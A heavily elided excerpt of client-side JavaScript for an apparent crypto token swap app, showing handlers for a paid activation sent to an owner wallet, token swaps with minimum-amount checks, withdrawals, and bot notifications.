...
async function loadConfig() {
    try {
        ...
        APP_CONFIG.ownerWallet = data.ownerWallet;
...
document.getElementById('activateBtn')?.addEventListener('click', async () => {
    ...
    const transaction = {
        ...
        messages: [{
            address: APP_CONFIG.ownerWallet,
            amount: amountNano
        }]
    };
    ...
    try {
        ...
        if (verifyData.success) {
            await loadUserData();
            showStatus('swapStatus', '✅ Swap activated! You can now swap.', 'success');
            await notifyBot('activation_success');
        } else {
            showStatus('swapStatus', '❌ ' + verifyData.error, 'error');
        }
...
document.getElementById('swapFrom')?.addEventListener('input', function() {
    ...
    swapBtn.disabled = amount > balance || amount < APP_CONFIG.minSwap;
});
...
document.getElementById('swapBtn')?.addEventListener('click', async () => {
    ...
    if (isNaN(amount) || amount < APP_CONFIG.minSwap) {
        showStatus('swapStatus', `❌ Minimum swap is ${APP_CONFIG.minSwap} AXC`, 'error');
        return;
    }
    ...
    try {
        ...
        if (data.success) {
            ...
            await notifyBot('swap_success', { amount, usdtAmount: data.usdtAmount });
...
document.getElementById('withdrawBtn')?.addEventListener('click', async () => {
    ...
    try {
        ...
        if (data.success) {
            ...
            await notifyBot('withdrawal_submitted', { amount, address });
        } else {
